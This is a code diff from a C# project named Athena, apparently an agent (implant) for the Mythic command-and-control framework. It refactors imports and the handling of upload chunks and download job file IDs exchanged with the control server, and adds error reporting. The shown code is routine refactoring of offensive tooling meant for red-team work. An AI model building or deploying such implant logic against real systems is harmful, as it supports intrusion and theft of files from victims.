@@ -1,8 +1,4 @@
-﻿using Athena.Commands.Model;
-using Athena.Config;
-using Athena.Mythic.Model;
-using Athena.Mythic.Model.Response;
-using Athena.Mythic.Model.Checkin;
+﻿using Athena.Config;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
@@ -10,6 +6,10 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net;
 using System.Threading.Tasks;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Tasks;
+using Athena.Models.Mythic.Response;
+using Athena.Models.Athena.Commands;
 
 namespace Athena
 {
@@ -327,44 +327,48 @@ namespace Athena
                             }
                         }
 
-
-                        //I think there might be issues when downloading and uploading files at the same time
+                        //Handle Upload/Download Responses
                         foreach (var response in cs.responses)
                         {
                             //Spin off new thread to upload new chunks
-                            //Todo Change this to make use of an object instead of trying to mess with threads. (Example how SOCKS is handled)
-                            //e.g. create an UploadChunk(int chunkNum, byte[] chunkData);
                             if (!String.IsNullOrEmpty(response.chunk_data))
                             {
-                                //Spin up new task to handle uploads
+                                //Spin up new task to handle uploads/downloads
                                 Task.Run(() =>
                                 {
                                     try
                                     {
-                                        //Get upload and mythic job
-                                        MythicUploadJob uj = Globals.uploadJobs[response.task_id];
-                                        MythicJob job = Globals.jobs[response.task_id];
-                                        
-                                        //Get current upload values
-                                        uj.total_chunks = response.total_chunks;
-                                        uj.chunk_num = response.chunk_num;
-
-                                        //Make sure we're tracking the download properly.
-                                        if (!uj.chunkUploads.ContainsKey(response.chunk_num))
+                                        //Upload
+                                        if (Globals.uploadJobs.ContainsKey(response.task_id))
                                         {
-                                            uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data),job);
-                                            //Lock the Dictionary<int,string>()
-                                            //I wonder if I could update this to use concurrent bag instead?
-                                            uj.locked = true;
-                                            uj.chunkUploads.Add(response.chunk_num, response.chunk_data);
+                                            //Get upload and mythic job
+                                            MythicUploadJob uj = Globals.uploadJobs[response.task_id];
+                                            MythicJob job = Globals.jobs[response.task_id];
 
-                                            //Unlock the Dictionary so that it can be written
-                                            uj.locked = false;
+                                            uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data), job);
+                                        }
+
+                                        //Download
+                                        else if (Globals.downloadJobs.ContainsKey(response.task_id))
+                                        {
+                                            if (!String.IsNullOrEmpty(response.file_id))
+                                            {
+                                                MythicDownloadJob j = Globals.downloadJobs[response.task_id];
+                                                if (string.IsNullOrEmpty(j.file_id))
+                                                {
+                                                    j.file_id = response.file_id;
+                                                    j.hasoutput = false;
+                                                }
+                                            }
                                         }
                                     }
-                                    catch
+                                    catch (Exception e)
                                     {
-
+                                        MythicJob job = Globals.jobs[response.task_id];
+                                        job.errored = true;
+                                        job.complete = true;
+                                        job.taskresult = e.Message;
+                                        job.hasoutput = true;
                                     }
                                 });
                                 
